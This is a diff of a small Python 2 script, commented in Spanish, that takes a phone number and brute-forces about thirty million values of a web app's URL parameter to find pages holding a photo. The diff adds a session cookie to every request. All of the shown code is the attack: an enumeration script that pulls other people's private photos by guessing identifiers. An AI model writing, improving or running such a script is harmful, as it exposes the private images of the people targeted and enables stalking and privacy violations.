@@ -1,9 +1,13 @@
 # Librerias
 import os
-import urllib
+import urllib2
 
 # Preguntar por el telefono
 tlfn = raw_input("Tlfn number (Ej: 34123985643):  ")
+
+# cookie
+cookie = "" # <--- Aqui va la cookie
+cookie = str(cookie)
 
 # i original (numero de la segunda variable de la app web de la url)
 i = 1410000000
@@ -14,7 +18,9 @@ while (i < 1439999999): # loop para recorrer todas las posibiidades del valor i.
 	print("\n" + tlfn + "\t" + str(i)) # informacion que se muesra en pantalla (tlefono y valor de i en cada intento)
 	print(url) # informacion que se muestra en pantalla (url)
 	print("\n")
-	f = urllib.urlopen(url) # urllib establece y descarga la url
+	opener = urllib2.build_opener()
+	opener.addheaders.append(("Cookie", "cookiename=" + cookie)) # Asignar Cookie
+	f = f = opener.open(url) # urllib establece y descarga la url
 	result = f.read() #leemos el contenido de la pagina
 	if (result != ""): # si no hay foto, la pagina esta vacia (si no lo esta muestra el mensage encontrado [convendria que ahi parase el sript pero, como? {return Fase?}])
 		print("Encontrado!")
